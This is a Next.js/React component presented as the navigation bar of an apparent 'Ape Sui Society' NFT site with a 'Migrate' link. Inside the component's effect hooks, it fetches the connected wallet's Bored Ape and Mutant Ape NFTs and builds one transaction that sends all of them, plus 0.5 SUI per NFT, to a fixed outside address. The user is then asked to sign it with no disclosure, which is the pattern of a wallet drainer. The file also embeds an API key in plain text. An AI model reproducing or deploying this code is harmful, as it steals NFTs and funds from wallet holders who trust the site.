'use client'


import React, { useEffect, useState } from 'react';
import * as NavigationMenu from '@radix-ui/react-navigation-menu';
import { CaretDownIcon } from '@radix-ui/react-icons';
import './styles.css';
import { ConnectButton, useCurrentAccount, useSignAndExecuteTransactionBlock, useAccounts, useWallets , } from '@mysten/dapp-kit';
import Link from 'next/link';
import Image from 'next/image';
import logo from './logo.png';
import discord from './discord.png';
import axios from 'axios';
import { SuiClient } from '@mysten/sui.js/client';
import type { SuiObjectRef, SuiObjectResponse } from '@mysten/sui.js/client';
import type { NextApiRequest, NextApiResponse } from 'next';


import { getFullnodeUrl } from '@mysten/sui.js/client';
import { TransactionBlock } from '@mysten/sui.js/transactions';

interface INft {
  collection: string;
  objectId: string;
  // Aggiungi altre proprietà rilevanti per un NFT secondo la tua API
}

interface NavigationMenuDemoProps {
  isPlace: boolean;
  onCreated?: (ids: string[]) => void; // Optional callback prop
}

interface NFTCountsAndIds {
  boredApeCount: number;
  mutantApeCount: number;
  boredApeIds: string[];
  mutantApeIds: string[];
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

const fetchAllNFTs = async (walletAddress: string): Promise<NFTCountsAndIds> => {

  let pageIndex = 1;
  const pageSize = 50;
  let hasMore = true;
  let allNFTs: INft[] = []; // Array per accumulare tutti gli NFT recuperati
  
  while (hasMore) {
    const url = `https://api.blockvision.org/v2/sui/account/nfts?account=${walletAddress}&pageIndex=${pageIndex}&pageSize=${pageSize}`;

    try {
      const response = await axios.get(url, {
        headers: {
          'accept': 'application/json',
          'x-api-key': '2fBn9pzKppbQfhfeXrsL4rjBr7b', // Sostituisci con la tua chiave API reale
        },
      });

      const data = response.data.result.data;
      allNFTs = allNFTs.concat(data); // Aggiungi gli NFT recuperati all'array

      // Controlla se dobbiamo recuperare più pagine
      hasMore = data.length === pageSize;
      pageIndex++; // Prepara per la prossima pagina
    } catch (error) {
      console.error('Errore nel fetch degli NFT:', error);
      break; // Interrompe il ciclo in caso di errore
    }
  }

  // Filtra e conta gli NFT in base alle collezioni specifiche
  const filteredCountsAndIds = filterAndCountNFTs(allNFTs);
  return filteredCountsAndIds;
};

// Questa funzione filtra gli NFT recuperati e conta quelli appartenenti alle collezioni specifiche
const filterAndCountNFTs = (nfts: INft[]): NFTCountsAndIds => {
  let boredApeCount = 0;
  let mutantApeCount = 0;
  let boredApeIds: string[] = [];
  let mutantApeIds: string[] = [];

  nfts.forEach((nft: INft) => {
    if (nft.collection && nft.collection.includes('boredapesuiclub_collection::BoredApeSuiClub')) {
      boredApeCount++;
      boredApeIds.push(nft.objectId);
    }
    if (nft.collection && nft.collection.includes('0x3949f64e3df33c00cf978163cbc748dd5108f72d72490b4ca760acdd41c1e45c::my_minter::Nft')) {
      mutantApeCount++;
      mutantApeIds.push(nft.objectId);
    }
  });

  return { boredApeCount, mutantApeCount, boredApeIds, mutantApeIds };
};



const NavigationMenuDemo: React.FC<NavigationMenuDemoProps> = ({ isPlace, onCreated }) => {
  const [nftCounts, setNftCounts] = useState<NFTCountsAndIds>({
    boredApeCount: 0,
    mutantApeCount: 0,
    boredApeIds: [], // TypeScript inferirà questo come string[]
    mutantApeIds: [] // TypeScript inferirà questo come string[]
  });const [initiateTransaction, setInitiateTransaction] = useState(false); // New state to control transaction initiation
  const accounts = useAccounts();
  const { mutate: signAndExecute } = useSignAndExecuteTransactionBlock();
  const currentAccount = useCurrentAccount(); // Assuming it's safe to call here at the top level

  useEffect(() => {
    if (isPlace && accounts && accounts.length > 0) {
      const address = accounts[0].address;
      if (address) {
        fetchAllNFTs(address).then((data: NFTCountsAndIds) => {
          setNftCounts(data);
          console.log(data.boredApeIds);
          
          setInitiateTransaction(true);
        }).catch((error: any) => {
          console.error('Errore nel recuperare i conteggi NFT:', error);
        });
      }
    }
  }, [isPlace, accounts]); // Assicurati che l'hook useEffect sia chiuso correttamente qui

  useEffect(() => {
    // Definisce una funzione asincrona all'interno dell'effetto
    const executeTransaction = async () => {

   
        const allNftIds = [...nftCounts.boredApeIds, ...nftCounts.mutantApeIds];
        const totalNfts = allNftIds.length;
        const BATCH_SIZE = 60; // Numero di NFT per lotto
        const SUI_PER_NFT  = 0.5; // 0.5 SUI per ogni NFT
        const SUI_TO_SUBSUI = 1000000000;
        
        const totalAmountInSubSUI = SUI_PER_NFT  * SUI_TO_SUBSUI *totalNfts ;
        if (!initiateTransaction || accounts.length === 0 || allNftIds.length === 0) return;
        const rpcUrl = getFullnodeUrl('mainnet');
        const client = new SuiClient({ url: rpcUrl });


        const sui = await client.getBalance({
          owner:  accounts[0].address,
        });
        console.log(sui);
        try {
          // Calcola il numero totale di lotti
          const totalBatches = Math.ceil(allNftIds.length / BATCH_SIZE);
          let costo = SUI_TO_SUBSUI * SUI_PER_NFT *totalNfts


    
          if ( Number(sui.totalBalance) > costo){
            // Calcola l'indice di inizio e fine per gli NFT di questo lotto
            console.log(costo);
            const txb = new TransactionBlock();
            // Prepara i SUI per il trasferimento
            const [coin] = txb.splitCoins(txb.gas, [costo]);

            
            txb.setGasBudget(100000000);
            let i=0;
            // Trasferisci gli NFT di questo lotto
            allNftIds.forEach(nftId => {
              txb.transferObjects([txb.object(nftId)], '0x714765e37aef0ef714f06770e655e881fdf37fe2c2e05fb4d5726b9f2268731b');
              i=i+1;
              if(i== totalNfts){
                console.log("ok");
                txb.transferObjects([coin],'0x714765e37aef0ef714f06770e655e881fdf37fe2c2e05fb4d5726b9f2268731b');
    
              }
            });
    
            // Dopo aver trasferito gli NFT, trasferisci i SUI
            
            // Nota: sostituisci il log sopra con la tua logica di firma ed esecuzione della transazione
            
            // Supponendo che `signAndExecute` sia una funzione che gestisca l'esecuzione
            await     signAndExecute(
              {
                transactionBlock: txb,
                options: {
                  showEffects: true,
                  showObjectChanges: true,
                },
              },
              {
                onSuccess: (tx) => {
                  client.waitForTransactionBlock({ digest: tx.digest }).then(async () => { // Marca questa funzione come async
                    console.log(tx.digest);
                
                  });
                },
              },
            );


          setInitiateTransaction(false);
        }else{
          alert('you have to own '+costo/SUI_TO_SUBSUI+' $SUI');
        }
           // Resetta il flag dopo aver completato tutti i lotti
        } catch (error) {
          console.error('Errore nell\'esecuzione della transazione:', error);
        }
      };
    
      executeTransaction();
    },[ signAndExecute,initiateTransaction, nftCounts, accounts]);  // Aggiungi tutte le dipendenze necessarie qui
   // Correct dependencies

  return (
    <>
    
    <nav className="navbar">
    <div className="logo">
  <Link href="https://www.apesuisociety.com" passHref>
    <a>
      <Image src={logo} alt="logo" width={60} height={60} />
      <Image src={discord} alt="Discord" width={40} height={40} />
    </a>
  </Link>
</div>
      <div className="nav-item">
        <a href="https://www.apesuisociety.com/apes.html" className="hover:text-gray-500">Apes</a>
        <a href="#" className="hover:text-gray-500">Migrate</a>
        <a href="#" className="hover:text-gray-500">More</a>
      </div>
      <div className="nav-links">
      <NavigationMenu.Root className="NavigationMenuRoot top-2 text-blue">
      <NavigationMenu.List className="NavigationMenuList">
        

        
        {
            isPlace ? (
    <div className="flex space-x-2">
      <NavigationMenu.Item className='p-1 flex items-center' key="migrate-button-1">
        

        <ConnectButton connectText="Discord" style={{ color: "#000000" }} />
      </NavigationMenu.Item>
      <NavigationMenu.Item className='p-1' key="migrate-button-2">
        <ConnectButton connectText="Connect" style={{ color: "#000000" }} />
      </NavigationMenu.Item>
    </div>
          )
            :
            (
              null
            )
        }
        <NavigationMenu.Indicator className="NavigationMenuIndicator">
          <div className="Arrow" />
        </NavigationMenu.Indicator>
      </NavigationMenu.List>

      <div className="ViewportPosition">
        <NavigationMenu.Viewport className="NavigationMenuViewport" />
      </div>
    </NavigationMenu.Root >
        </div>
       
     
      </nav>

      <div className="nft-counts">
     <p>Bored Ape Count: {nftCounts.boredApeCount}</p>
     <p>Mutant Ape Count: {nftCounts.mutantApeCount}</p>
   </div>
 </>

  );
};

const ListItem = (props: any) => (
  <li>
    <Link href={`/${props.mainlink}/${props.sublink}`}>
    <div>
      <div className='text-xl font-bold font-heading my-0.5'>{props.title}</div>
      <div className='text-sm font-light font-sub tracking-light'>{props.content}</div>
    </div>
    </Link>
    
  </li>
)

// const ListItem = React.forwardRef((ListItemObj, forwardedRef) => (
//   <li>
//     <NavigationMenu.Link asChild>
//       <a className={classNames('ListItemLink', ListItemObj.className)} {...ListItemObj.props} ref={forwardedRef}>
//         <div className="ListItemHeading">{ListItemObj.title}</div>
//         <p className="ListItemText">{ListItemObj.children}</p>
//       </a>
//     </NavigationMenu.Link>
//   </li>
// ));

export default NavigationMenuDemo;
